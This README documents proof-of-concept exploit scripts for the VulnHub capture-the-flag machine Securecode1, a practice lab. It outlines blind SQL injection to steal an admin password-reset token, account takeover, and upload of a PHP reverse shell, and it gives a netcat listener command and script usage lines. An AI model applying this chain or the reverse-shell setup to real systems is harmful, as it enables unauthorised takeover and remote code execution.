# securecode1
PoC for VulnHub machine Securecode1

Vulnerable machine author: sud0root

Link to vulernable VM: https://www.vulnhub.com/entry/securecode-1,651/

start a NetCat listener with:
 nc -nlvp <IP> <port>

usage: python3 poc.py -t \<target\> -p \<password to set\> -i \<attacker IP\> -pt \<attacker port\>
 
 Explaination of script below contains spoilers, read/use only if stuck.
  
This script leverages boolean based blind SQL Injection to enumerate the adminstrative user on the "HackShop" web application on the VulnHub machine Securecode1. It then requests a password reset token for the adminstrative user. 
  
The blind SQLi is then used again to enumerate the token. The token is then passed to reset the administrative user account's password with the password passed with the -p flag.
  
The script then logs in and pulls the first flag.
 
A php reverse shell is then uploaded and executed connecting to the IP and port suppled by the -i and -pt options.

 version 1 poc.py is hardcode to utilize proxy at 127.0.0.1:8080
 
poc2ab.py is a standalone auth bypass that will use SQLi to pull the admin username, request a reset token, pull token with SQLi, reset the password, login, and pull the first flag. It is an imporvement on the auth bypass in poc.py leveraging a bit shift instead of sequential bruteforce drastically increasing the speed.
 
 poc2.py is auth bypass using bit shift plus RCE
 
 usage:
 
 python3 poc2ab.py -t <target> -p <password to set>
 
 python3 poc2.py -t <target> -p <password to set> -i <Attacker IP> -pt <Attacker port>
 
 -d or --debug can be added to utilize Burp or ZAP proxies runnin on 127.0.0.1:8080
  

